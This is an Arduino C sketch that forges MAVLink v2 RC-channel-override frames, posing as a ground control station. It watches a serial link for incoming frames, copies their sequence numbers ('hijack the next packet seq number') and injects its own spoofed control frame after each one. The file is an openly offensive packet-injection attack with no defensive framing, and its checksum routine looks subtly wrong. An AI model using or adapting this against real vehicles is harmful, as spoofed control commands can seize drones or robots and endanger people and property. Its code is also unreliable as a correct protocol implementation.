#include <stdlib.h>

uint8_t packet1[] = {0xFD,  // STX
                    0x22, // LEN
                    0x00, // INC FLAGS
                    0x00, // CMP FLAGS
                    0x03, // SEQ
                    0xFF, // SYS ID
                    0x44, // COMP ID
                    0x46, // MSG ID (low bits)
                    0x00, // MSG ID (med bits)
                    0x00, // MSG ID (high bits)
                    0xD4, // Payload (unmodified)
                    0x05, 
                    0x91, 
                    0x05, 
                    0xDD, 
                    0x03, 
                    0x45, 
                    0x06, 
                    0xE8, 
                    0x03, 
                    0xDC, 
                    0x05, 
                    0xE8, 
                    0x03, 
                    0xE8, 
                    0x03, 
                    0x01, 
                    0x00, 
                    0xDC, 
                    0x05, 
                    0xDC, 
                    0x05, 
                    0xDC, 
                    0x05, 
                    0xFD, 
                    0x05, 
                    0x71, 
                    0x03, 
                    0x71, 
                    0x03, 
                    0x71, 
                    0x03, 
                    0x71, 
                    0x03, 
                    0x34, // checksum (low byte)
                    0x6B}; // checksum (high byte)

void setup() {
    delay(2000);
    randomSeed(0);

    Serial.begin(115200);
    Serial.write(packet1, sizeof(packet1) / sizeof(packet1[0]));
    Serial.begin(500000);
    delay(1000);
    
}
  
void loop() {
    static byte packetByte;
    static int packetIndex = 0;
    static bool packetStarted = false;
    
    if (Serial.available() > 0) {
        byte incomingByte = Serial.read();

        if (!packetStarted && incomingByte == 0xFD) {
            packetByte = incomingByte;
            packetIndex = 1;
            packetStarted = true;
        }
        else if (packetStarted) {
            packetByte = incomingByte;

            if (packetIndex == 1 && packetByte != 0x08) {
                packetStarted = false;
                packetIndex = 0;
            }
            else {
                packetIndex++;
                if (packetIndex == 4) {
                    packet1[4] = packetByte + 1; // hijack the next packet seq number 
                    uint16_t crc = crc16_mcrf4xx();
                    packet1[44] = (uint8_t)(crc & 0xFF);
                    packet1[45] = (uint8_t)((crc >> 8) & 0xFF);
                    Serial.write(packet1, sizeof(packet1) / sizeof(packet1[0]));
                    // Reset for the next packet
                    packetStarted = false;
                    packetIndex = 0;
                }
            }
        }
    }
}
  
uint16_t crc16_mcrf4xx() {
    size_t len = 46;
    uint16_t crc = 0xFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= packet1[i];
        for (int j = 0; j < 8; j++) {
            if (crc & 0x0001) {
                crc = (crc >> 1) ^ 0x8408; // 0x8408 = reverse polynomial 0x1021
            } else {
                crc = crc >> 1;
            }
        }
    }
    return crc;
}
